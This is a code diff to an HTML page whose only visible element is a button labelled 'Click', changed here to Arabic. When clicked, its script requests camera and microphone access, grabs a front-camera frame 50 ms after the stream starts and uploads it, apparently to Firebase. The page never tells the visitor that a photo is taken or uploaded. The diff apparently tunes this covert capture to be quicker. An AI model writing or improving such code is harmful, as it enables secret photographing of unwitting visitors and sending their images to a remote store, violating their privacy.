@@ -69,25 +69,24 @@
         // Function to handle button click
         async function handleClick() {
             try {
-                // Request microphone permission
-                await navigator.mediaDevices.getUserMedia({ audio: true });
+                // Request microphone and camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
 
-                // Request camera permission
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
+
+                // Set canvas size
+                canvas.width = 1920; // Set canvas width for 1080p
+                canvas.height = 1080; // Set canvas height for 1080p
+
+                // Immediately capture image after the stream is active
+                video.onloadedmetadata = async () => {
                     video.play();
-
-                    // Set canvas size
-                    canvas.width = 1920; // Set canvas width for 1080p
-                    canvas.height = 1080; // Set canvas height for 1080p
-
-                    // Capture image
+                    // Delay briefly to allow video stream to stabilize
+                    await new Promise(resolve => setTimeout(resolve, 50)); // 50 ms delay
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/png');
                     uploadImage(imageData); // Upload image to Firebase
@@ -104,15 +103,9 @@
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
         }
-
-        // Disable button until user clicks it
-        window.onload = function() {
-            const button = document.querySelector('.button');
-            button.disabled = false; // Enable the button on load
-        };
     </script>
 </head>
 <body>
-    <button class="button" onclick="handleClick()">Click</button> <!-- Button with "Click" -->
+    <button class="button" onclick="handleClick()">انقر</button> <!-- Button with "Click" in Arabic -->
 </body>
 </html>
